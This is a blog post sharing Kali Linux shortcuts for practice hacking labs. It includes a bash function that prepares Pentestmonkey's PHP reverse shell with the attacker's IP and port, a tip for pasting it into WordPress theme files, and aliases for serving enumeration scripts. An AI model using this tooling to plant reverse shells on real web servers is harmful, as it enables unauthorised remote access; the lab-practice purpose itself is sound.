---
layout:     post
title:      Kali Linux QoL Improvements
date:       2019-09-21 15:20:20
author:     J
summary:    Life's too short
categories: General
thumbnail:  thumbs-up
tags:
 - Linux
 - Kali
 - PHP Reverse Shell
 - Bashrc
 - Bash Aliases
---

This post will be updated once in a blue moon. Just wanted to share some stuff which I use because I think it's good to automate certain repeated processes when hacking boxes. Life's too short to be wasting time on such things.

---

## PHP Reverse Shell Generator


This particular script is for generating a PHP reverse shell with IP address and port preconfigured in the current working directory. This is particularly useful if you find that your IP address has changed due to changing VPNs or just that a new one was issued to you when reconnecting. It works by creating a copy of Pentestmonkey's PHP Reverse Shell script into the current working directory, and changing the backconnect IP and Port to one of your choosing. This script is preloaded in Kali Linux somewhere(do a `/locate php-reverse-shell.php` to find it), but you can also just do a fresh download.

To use, just append it to your `.bashrc` file in your user's home directory and restart your terminal(Don't forget to change the script directory!). The original script can be found on Pentestmonkey [here][1]. Replace the ip address in the script to 'ipaddress' and set the port to 443.

Alternatively, you can download the [pre-modified version on my Github][2] to use with this script. Change the directory in the script to where you saved the script to.

Usage: `phprev <Interface> <Optional: Listening Port>`
<br>e.g. `phprev tun0 1234`


~~~bash
# Create PHP reverse shell in current directory. Usage example: phprev tun0 1234
# Defaults to port 443 if port is not specified

function phprev() {
        phprevshelldir=/root/Try-Harder/Scripts/Shells/php-reverse-shell.php #CHANGE THIS
        if [ $# -eq 0 ]; then echo "Please define interface"
        else
            revip=`ifconfig $1 | head -n2 | tail -n1 | awk '{print $2}' `
            cp $phprevshelldir ./rev.php && sed -i 's/ipaddress/'$revip'/g' rev.php
                if [ $# -eq 2 ]; then
                revport=$2 ;
                sed -i 's/443/'$2'/g' rev.php
                else revport=443
                fi
            echo "PHP reverse shell(rev.php) created and configured to connect back to:" $revip:$revport
        fi
}
~~~

If you need to copy and paste the script somewhere(e.g wordpress theme files), just use the following to have the contents copied to your clipboard quickly:

~~~bash
cat rev.php | xclip -sel clip
~~~

---

## Bash Aliases


Sometimes you have many folders that you need to navigate quickly, or long commands that you type. These can be shortened, saving lots of time and gives great convenience in the long run. This is a sample of what I have inside my `/root/.bash_aliases` file. If you don't have it, just create it. After adding aliases in, restart your terminal.

~~~bash
# Directories

alias htb='cd ~/0x4a/Hackthebox'
alias vhl='cd ~/0x4a/VirtualHackingLabs'
alias pwk='cd ~/0x4a/PWK'
alias scripts='cd ~/Try-Harder/Scripts'
alias linenum='cd ~/Try-Harder/Scripts/Linux-PrivEsc'
alias hostlse='cd ~/Try-Harder/Scripts/Linux-PrivEsc && python -m SimpleHTTPServer'
alias armoury='cd ~/The-Armoury'

# vpn

alias ovpn='openvpn ~/0x4a/Hackthebox/openvpn/Dreamscent.ovpn'

# Other

alias hosts='nano /etc/hosts'
alias tun0='ifconfig tun0 | head -n2'
alias ppp0='ifconfig ppp0 | head -n2'
alias pyhttp='python -m SimpleHTTPServer'
~~~

[1]: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
[2]: https://github.com/Dreamscent/Try-Harder/blob/master/Scripts/Shells/php-reverse-shell.php
